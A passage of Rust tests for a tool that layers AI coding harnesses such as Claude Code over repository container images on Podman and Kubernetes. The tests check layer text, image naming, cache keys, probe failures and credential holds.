        let second = ensure_session_with(&builder, &runner, &store, repo, &other, &harness).await;
        assert_ne!(first.image, second.image);
        let removed = builder.removed.lock().unwrap().clone();
        assert_eq!(removed, vec![first.image.unwrap()]);
    }

    /// A harness that does not run in the repository's image is found when the
    /// layer is built. The session keeps the harness's own image and is told
    /// why, and the build is not repeated at every start.
    #[tokio::test]
    async fn a_harness_that_does_not_run_in_the_image_leaves_the_session_in_its_own() {
        let repo = Path::new("/src/musl-app");
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let harness = claude("localhost/tracon-harness-claude");
        for (says, exit) in [("sh: claude: not found", 127), ("9.9.9 (Claude Code)", 0)] {
            let store = Store::open_in_memory().unwrap();
            let runner = ProbeRunner::saying(says, exit);
            let got =
                ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
            assert_eq!(got.image, None, "{says}");
            assert_eq!(got.source(), "harness image");
            assert!(got.note.unwrap().contains("does not run"), "{says}");
            let row = store
                .latest_repo_image("/src/musl-app", "session:claude")
                .unwrap()
                .unwrap();
            assert_eq!(
                (row.status.as_str(), row.log_tail.as_str()),
                ("failed", says)
            );
        }
        assert_eq!(builder.removed.lock().unwrap().len(), 2);

        let runner = ProbeRunner::saying("nope", 1);
        ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        let builds = builder.builds.lock().unwrap().len();
        let again =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert!(again.note.is_some());
        assert_eq!(builder.builds.lock().unwrap().len(), builds);
    }

    /// Which sessions get a repository image at all: one whose repository has
    /// an entry naming an image, on a harness that is a single binary, on a
    /// runtime that can build.
    #[tokio::test]
    async fn a_session_keeps_the_harness_image_where_no_repository_image_applies() {
        let backend: Arc<dyn Backend> = Arc::new(crate::runner::local::LocalBackend);
        let store = Arc::new(Store::open_in_memory().unwrap());
        let cfg = Arc::new(Config {
            repo: vec![Repo {
                path: "/src/app".into(),
                image: Some(BASE_IMAGE.into()),
                ..Default::default()
            }],
            ..Default::default()
        });
        let ask = |repo: &'static str, harness: &'static str| {
            let (backend, cfg, store) = (backend.clone(), cfg.clone(), store.clone());
            async move {
                let quiet = || panic!("nothing is built here");
                session_image(
                    &backend,
                    &cfg,
                    &store,
                    Path::new(repo),
                    (harness, "1"),
                    &quiet,
                )
                .await
            }
        };
        assert_eq!(ask("/src/other", "claude").await, SessionImage::default());
        let opencode = ask("/src/app", "opencode").await;
        assert!(opencode.image.is_none());
        assert!(opencode.note.unwrap().contains("runs in its own image"));
        let unbuildable = ask("/src/app", "claude").await;
        assert!(unbuildable.note.unwrap().contains("cannot build images"));
    }

    /// A runtime that pulls its harness images from a registry and builds
    /// with `builder`.
    struct Pulling {
        builder: FakeBuilder,
    }
    #[async_trait]
    impl Backend for Pulling {
        fn kind(&self) -> &'static str {
            "pulling"
        }
        async fn setup(
            &self,
            _cfg: &Config,
            _rebuild: bool,
        ) -> Result<(), crate::boundary::BoundaryError> {
            Ok(())
        }
        async fn check_all(&self, _cfg: &Config, _deep: bool) -> crate::boundary::BoundaryReport {
            crate::boundary::BoundaryReport { checks: Vec::new() }
        }
        fn runner(&self, _extra: Vec<crate::runner::Mount>) -> Arc<dyn Runner> {
            Arc::new(ProbeRunner::saying("1 (Claude Code)", 0))
        }
        fn runner_for(&self, _id: &str, _extra: Vec<crate::runner::Mount>) -> Arc<dyn Runner> {
            Arc::new(ProbeRunner::saying("1 (Claude Code)", 0))
        }
        fn image_builder(&self) -> Option<&dyn ImageBuilder> {
            Some(&self.builder)
        }
        fn harness_image(&self, _cfg: &Config, harness_id: &str) -> String {
            format!("ghcr.io/cosmicspork/tracon-harness-{harness_id}:9")
        }
        fn runs_sessions_in_repository_images(&self) -> bool {
            true
        }
        async fn import_volume(
            &self,
            _volume: &str,
            _source: &Path,
        ) -> Result<(), crate::boundary::BoundaryError> {
            Ok(())
        }
        async fn export_volume(
            &self,
            _volume: &str,
            _destination: &Path,
        ) -> Result<(), crate::boundary::BoundaryError> {
            Ok(())
        }
        fn harness_host(&self) -> String {
            "localhost".into()
        }
        fn harness_home(&self) -> String {
            "/home/harness".into()
        }
        async fn reconcile(&self, _names: &[String]) {}
    }

    /// A runtime that pulls its harness images from a registry names the one
    /// a layered build copies the harness from, not Podman's local name.
    #[tokio::test]
    async fn the_layer_copies_the_harness_from_the_runtimes_own_image() {
        let pulling = Arc::new(Pulling {
            builder: FakeBuilder::default(),
        });
        let backend: Arc<dyn Backend> = pulling.clone();
        let store = Arc::new(Store::open_in_memory().unwrap());
        let cfg = Arc::new(Config {
            repo: vec![Repo {
                path: "/src/app".into(),
                image: Some(BASE_IMAGE.into()),
                ..Default::default()
            }],
            ..Default::default()
        });
        let got = session_image(
            &backend,
            &cfg,
            &store,
            Path::new("/src/app"),
            ("claude", "1"),
            &|| {},
        )
        .await;
        assert!(got.image.is_some(), "{got:?}");
        let builds = pulling.builder.builds.lock().unwrap();
        assert!(
            builds[0]
                .1
                .starts_with("FROM ghcr.io/cosmicspork/tracon-harness-claude:9@sha256:"),
            "{}",
            builds[0].1
        );
    }

    /// The layer copies the harness out of its image and has to set what that
    /// image sets; the image's own definition is the authority for both.
    #[test]
    fn the_claude_layer_carries_what_the_harness_image_sets() {
        let image = include_str!("../../containers/harness-claude/Containerfile");
        let layer = harness_layer("claude", &RunAs::Root).unwrap().lines;
        assert!(image.contains("/usr/local/bin/claude"));
        for variable in [
            "CLAUDE_CONFIG_DIR=/root/.claude",
            "DISABLE_AUTOUPDATER=1",
            "DISABLE_TELEMETRY=1",
        ] {
            assert!(
                image.contains(variable),
                "{variable} left the harness image"
            );
            assert!(layer.contains(variable), "{variable} is not in the layer");
        }
        let exported: usize = image
            .lines()
            .skip_while(|line| !line.starts_with("ENV "))
            .take_while(|line| line.starts_with("ENV ") || line.starts_with("    "))
            .count();
        assert_eq!(
            exported, 3,
            "the harness image sets something the layer does not"
        );
        assert!(harness_layer("opencode", &RunAs::Root).is_none());
    }

    #[test]
    fn image_names_are_readable_and_distinct() {
        let a = image_name(Path::new("/src/My App"));
        let b = image_name(Path::new("/other/My App"));
        assert!(a.starts_with("localhost/tracon-repo-my-app-"), "{a}");
        assert_ne!(a, b);
        assert!(a
            .trim_start_matches("localhost/")
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-'));
    }

    /// What Podman builds is exactly what it built before runtimes had
    /// profiles: the same layer text, the same probe, and the same keys, so
    /// no image a Podman node already built is rebuilt or orphaned.
    #[tokio::test]
    async fn podmans_layers_and_keys_are_what_they_always_were() {
        let source = "localhost/tracon-repo-app-src@sha256:abc";
        let normalised_text = r#"FROM localhost/tracon-repo-app-src@sha256:abc
USER 0:0
ENV HOME=/root
RUN mkdir -p /work /cache && if [ -d /etc/profile.d ]; then printf 'export PATH="%s"\n' "$PATH" > /etc/profile.d/zz-tracon-path.sh; fi
WORKDIR /work
ENTRYPOINT []
"#;
        assert_eq!(normalised(source, &RunAs::Root), normalised_text);
        let layer = harness_layer("claude", &RunAs::Root).unwrap();
        let lines = "COPY --from=harness /usr/local/bin/claude /usr/local/bin/claude\n\
                     ENV CLAUDE_CONFIG_DIR=/root/.claude DISABLE_AUTOUPDATER=1 DISABLE_TELEMETRY=1\n";
        assert_eq!(layer.lines, lines);
        assert_eq!(
            layer.probe,
            "/usr/local/bin/claude --version && git --version"
        );
        assert_eq!(
            layered(source, "localhost/h@sha256:def", &layer, &RunAs::Root),
            format!("FROM localhost/h@sha256:def AS harness\n{normalised_text}{lines}")
        );

        // The recipe hashes the parts it always did, and nothing else.
        let tmp = checkout();
        let repo = tmp.path();
        let recipe = recipe(repo, &entry(repo), &RunAs::Root).await.unwrap();
        let dir = repo.to_string_lossy();
        let blob = crate::review::resolve(&dir, "HEAD:.devcontainer/Dockerfile")
            .await
            .unwrap();
        let mut hash = Sha256::new();
        for part in [
            "1",
            ".devcontainer/Dockerfile",
            &blob,
            ".devcontainer",
            &recipe.context_tree,
        ] {
            hash.update(part.as_bytes());
            hash.update([0]);
        }
        assert_eq!(recipe.hash, hex::encode(hash.finalize()));

        // And so does the session layer's key.
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let runner = ProbeRunner::saying("2.1.295 (Claude Code)", 0);
        let harness = claude("localhost/tracon-harness-claude");
        ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        let identity = builder.identity("localhost/tracon-harness-claude").await;
        let mut hash = Sha256::new();
        for part in ["1", BASE_IMAGE, &identity.unwrap(), lines] {
            hash.update(part.as_bytes());
            hash.update([0]);
        }
        let row = store
            .ready_repo_image(&repo.to_string_lossy(), "session:claude")
            .unwrap()
            .unwrap();
        assert_eq!(row.recipe_hash, hex::encode(hash.finalize()));
    }

    /// A pod is never root: its layer gives the harness uid the workspace,
    /// the cache and its home, ends as that uid, and the session layer adds a
    /// static init the probe proves runs. Its keys are its own.
    #[tokio::test]
    async fn a_pod_layer_runs_as_the_harness_uid_with_an_init() {
        let source = "localhost/tracon-repo-app-src@sha256:abc";
        assert_eq!(
            normalised(source, &pod()),
            r#"FROM localhost/tracon-repo-app-src@sha256:abc
USER 0:0
RUN mkdir -p /work /cache /home/harness && chown 65532:65532 /work /cache && chown -R 65532:65532 /home/harness && if ! grep -q '^[^:]*:[^:]*:65532:' /etc/passwd 2>/dev/null; then echo 'harness:x:65532:65532::/home/harness:/bin/sh' >> /etc/passwd; fi && if ! grep -q '^[^:]*:[^:]*:65532:' /etc/group 2>/dev/null; then echo 'harness:x:65532:' >> /etc/group; fi && if [ -d /etc/profile.d ]; then printf 'export PATH="%s"\n' "$PATH" > /etc/profile.d/zz-tracon-path.sh; fi
ENV HOME=/home/harness
WORKDIR /work
USER 65532:65532
ENTRYPOINT []
"#
        );
        let layer = harness_layer("claude", &pod()).unwrap();
        assert!(layer
            .lines
            .contains("ENV CLAUDE_CONFIG_DIR=/home/harness/.claude "));
        assert_eq!(
            layer.probe,
            "/usr/local/bin/claude --version && git --version && /usr/libexec/tracon/tini --version"
        );
        let text = layered(source, "ghcr.io/h@sha256:def", &layer, &pod());
        assert!(text.starts_with("FROM ghcr.io/h@sha256:def AS harness\n"));
        assert!(
            text.ends_with("COPY --from=harness /usr/bin/tini-static /usr/libexec/tracon/tini\n")
        );
        assert!(!text.contains("/root"), "{text}");
        // Nothing after the last `USER` makes the harness root again.
        let last_user = text.rfind("\nUSER ").unwrap();
        assert!(text[last_user..].starts_with("\nUSER 65532:65532\n"));
        assert!(!text[last_user..].contains("RUN "), "{text}");
        assert_eq!(crate::runner::kube::SESSION_INIT, POD_INIT);

        // The uid and the home are the configured ones.
        let mut cfg = kubernetes();
        cfg.runtime.kubernetes.uid = 1000;
        cfg.runtime.kubernetes.harness_home = "/home/agent".into();
        let other = normalised(source, &RunAs::of(&cfg));
        assert!(other.contains("chown 1000:1000 /work /cache && chown -R 1000:1000 /home/agent"));
        assert!(other.contains("'harness:x:1000:1000::/home/agent:/bin/sh'"));
        assert!(other.contains("ENV HOME=/home/agent\n") && other.contains("USER 1000:1000\n"));

        let tmp = checkout();
        let repo = tmp.path();
        let podman = recipe(repo, &entry(repo), &RunAs::Root).await.unwrap();
        let kube = recipe(repo, &entry(repo), &pod()).await.unwrap();
        let elsewhere = recipe(repo, &entry(repo), &RunAs::of(&cfg)).await.unwrap();
        assert_ne!(podman.hash, kube.hash);
        assert_ne!(kube.hash, elsewhere.hash);
        assert_eq!(
            (podman.context_tree, podman.source_commit),
            (kube.context_tree, kube.source_commit)
        );
    }

    /// On Kubernetes the repository's image is built with the pod's layer,
    /// and a session's harness is layered over it from the harness image in
    /// its registry, probed, and kept apart from what Podman would build from
    /// the same base.
    #[tokio::test]
    async fn a_kubernetes_session_is_layered_with_the_pods_profile() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let cfg = kubernetes();
        let Ensured::Rebuilt(base) = ensure_with(
            &builder,
            &LocalRunner,
            &cfg,
            &store,
            repo,
            &entry(repo),
            &[],
            false,
        )
        .await
        else {
            panic!("the first ensure builds");
        };
        {
            let builds = builder.builds.lock().unwrap();
            assert!(
                builds[1].1.contains("USER 65532:65532\n"),
                "{}",
                builds[1].1
            );
            assert!(builds[1].1.contains("ENV HOME=/home/harness\n"));
        }
        let kube_recipe = base_row(&store, repo).recipe_hash;
        assert_eq!(
            kube_recipe,
            recipe(repo, &entry(repo), &pod()).await.unwrap().hash
        );

        let pulling = Arc::new(Pulling {
            builder: FakeBuilder::default(),
        });
        let backend: Arc<dyn Backend> = pulling.clone();
        let sessions = Arc::new(Store::open_in_memory().unwrap());
        let entries = vec![Repo {
            path: "/src/app".into(),
            image: Some(base.clone()),
            ..Default::default()
        }];
        let ask = |cfg: Config| {
            let (backend, sessions) = (backend.clone(), sessions.clone());
            async move {
                session_image(
                    &backend,
                    &Arc::new(cfg),
                    &sessions,
                    Path::new("/src/app"),
                    ("claude", "1"),
                    &|| {},
                )
                .await
            }
        };
        let on_kube = ask(Config {
            repo: entries.clone(),
            ..kubernetes()
        })
        .await;
        let image = on_kube.image.clone().expect("layered on Kubernetes");
        assert_eq!(on_kube.toolchain_image.as_deref(), Some(base.as_str()));
        {
            let builds = pulling.builder.builds.lock().unwrap();
            let text = &builds[0].1;
            assert!(
                text.starts_with("FROM ghcr.io/cosmicspork/tracon-harness-claude:9@sha256:"),
                "{text}"
            );
            assert!(text.contains(&format!("FROM {base}\n")));
            assert!(text.contains("USER 65532:65532\n"));
            assert!(text.contains("COPY --from=harness /usr/local/bin/claude"));
            assert!(text.contains("/usr/bin/tini-static /usr/libexec/tracon/tini"));
        }

        // Asked again on Kubernetes, nothing is built; asked on Podman, the
        // same base is a different layer, never the pod's.
        let again = ask(Config {
            repo: entries.clone(),
            ..kubernetes()
        })
        .await;
        assert_eq!(again.image.as_deref(), Some(image.as_str()));
        assert_eq!(pulling.builder.builds.lock().unwrap().len(), 1);
        let on_podman = ask(Config {
            repo: entries,
            ..Default::default()
        })
        .await;
        assert_ne!(on_podman.image, Some(image));
        let builds = pulling.builder.builds.lock().unwrap();
        assert_eq!(builds.len(), 2);
        assert!(builds[1].1.contains("USER 0:0\nENV HOME=/root\n"));
        assert!(!builds[1].1.contains("tini"));
    }

    /// A harness image the builder cannot find leaves the session in the
    /// harness's own image, saying why in the runtime's terms: the builder's
    /// own reason when it cannot reach anything, and on a pod never advice
    /// to build what a release publishes.
    #[tokio::test]
    async fn a_harness_image_that_cannot_be_found_says_why() {
        let repo = Path::new("/src/app");
        let builder = FakeBuilder::default();
        *builder.missing.lock().unwrap() = true;
        let runner = ProbeRunner::saying("2.1.295 (Claude Code)", 0);
        let store = Store::open_in_memory().unwrap();
        let ask = |run_as: RunAs| {
            let harness = claude_as("ghcr.io/cosmicspork/tracon-harness-claude:9", run_as);
            let (builder, runner, store) = (&builder, &runner, &store);
            async move {
                ensure_session_with(builder, runner, store, repo, BASE_IMAGE, &harness)
                    .await
                    .note
                    .unwrap()
            }
        };
        assert!(ask(RunAs::Root).await.contains("`tracon setup` builds it"));
        let pod_note = ask(pod()).await;
        assert!(
            pod_note.contains("could not be found in its registry"),
            "{pod_note}"
        );
        *builder.down.lock().unwrap() = Some("buildkitd refused the connection".into());
        assert_eq!(ask(pod()).await, "buildkitd refused the connection");
        assert!(builder.builds.lock().unwrap().is_empty());
    }

    /// A session layer that failed stands against its key, and a builder
    /// that could not fetch what it starts from cools down without being
    /// held against it; `tracon repo build` (a forced `ensure_base`) clears
    /// both for the repository, so its next session tries again at once.
    #[tokio::test]
    async fn repo_build_lets_a_failed_session_layer_try_again() {
        let repo = Path::new("/src/retry-app");
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let harness = claude_as("ghcr.io/cosmicspork/tracon-harness-claude:9", pod());

        // A registry that could not be reached: nothing recorded, cooling.
        *builder.broken.lock().unwrap() = true;
        let runner = ProbeRunner::saying("2.1.295 (Claude Code)", 0);
        let got = ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert!(got.note.unwrap().contains("buildkitd did not answer"));
        assert!(store
            .latest_repo_image("/src/retry-app", "session:claude")
            .unwrap()
            .is_none());
        *builder.broken.lock().unwrap() = false;
        let cooling =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert!(cooling.note.unwrap().contains("tried again in"));

        // A layer whose probe failed: recorded, and not retried unasked.
        forget_session_failures(&store, repo);
        let failing = ProbeRunner::saying("sh: claude: not found", 127);
        let failed =
            ensure_session_with(&builder, &failing, &store, repo, BASE_IMAGE, &harness).await;
        assert!(failed.note.unwrap().contains("does not run"));
        let builds = builder.builds.lock().unwrap().len();
        let again =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert!(again.image.is_none());
        assert_eq!(builder.builds.lock().unwrap().len(), builds);

        // `tracon repo build` clears it, even for an entry with nothing of
        // its own to build.
        let backend = crate::runner::local::LocalBackend;
        assert_eq!(
            ensure_base(&backend, &Config::default(), &store, repo, true).await,
            Ensured::Unconfigured
        );
        let retried =
            ensure_session_with(&builder, &runner, &store, repo, BASE_IMAGE, &harness).await;
        assert!(retried.image.is_some(), "{retried:?}");
        assert_eq!(builder.builds.lock().unwrap().len(), builds + 1);
    }

    /// An entry that keeps lending credentials to a preparation a peer's
    /// recipe changed is built and warmed by nothing (a forced build, a
    /// check's or a preparation's environment, a session, a default-branch
    /// change) until its hold is released; what last built stays in use.
    #[tokio::test]
    async fn a_held_entry_builds_and_warms_nothing_until_it_is_started() {
        use crate::store::recipe_offers::CredentialHoldRow;
        let tmp = checkout();
        let repo = tmp.path();
        let store = Arc::new(Store::open_in_memory().unwrap());
        let pulling = Arc::new(Pulling {
            builder: FakeBuilder::default(),
        });
        let backend: Arc<dyn Backend> = pulling.clone();
        let held_entry = Repo {
            prepare: vec!["npm ci".into()],
            egress: vec!["npm".into()],
            prepare_credentials: vec!["nova".into()],
            ..entry(repo)
        };
        let cfg = Arc::new(Config {
            repo: vec![held_entry.clone()],
            ..Default::default()
        });
        let hold = CredentialHoldRow {
            path: repo.to_string_lossy().into(),
            offer_id: "o".into(),
            sender_node: "n".into(),
            repo: "github.com/acme/app".into(),
            credentials: vec!["nova".into()],
            lending_hash: crate::mesh::recipe::lending_hash(&held_entry),
            created_ms: 1,
        };
        store.credential_hold_put(&hold).unwrap();
        let builds = || pulling.builder.builds.lock().unwrap().len();

        let forced = ensure_base(backend.as_ref(), &cfg, &store, repo, true).await;
        assert!(
            matches!(&forced, Ensured::Unavailable { reason } if reason.starts_with("held: nova")),
            "{forced:?}"
        );
        let checks = environment(backend.as_ref(), &cfg, &store, Some(repo)).await;
        assert!(
            checks.image_source.contains("held"),
            "{}",
            checks.image_source
        );
        let session = session_image(&backend, &cfg, &store, repo, ("claude", "1"), &|| {}).await;
        assert!(session.image.is_none());
        assert!(session.note.unwrap().contains("held"));
        assert_eq!(builds(), 0);

        // Started: it builds.
        assert!(store.credential_hold_release(&hold.path).unwrap());
        let built = ensure_base(backend.as_ref(), &cfg, &store, repo, false).await;
        let Ensured::Rebuilt(image) = built else {
            panic!("a released entry builds: {built:?}");
        };
        let after_start = builds();
        assert!(after_start > 0);

        // Held again, a default-branch change rebuilds nothing, forced or
        // not, and the image that stands is the one used.
        store.credential_hold_put(&hold).unwrap();
        commit_conf(repo, "changed");
        for force in [false, true] {
            let held = ensure_base(backend.as_ref(), &cfg, &store, repo, force).await;
            assert_eq!(
                held,
                Ensured::Stale {
                    using: image.clone(),
                    error: crate::mesh::recipe::held_reason(&hold),
                }
            );
        }
        assert_eq!(builds(), after_start);
    }
}
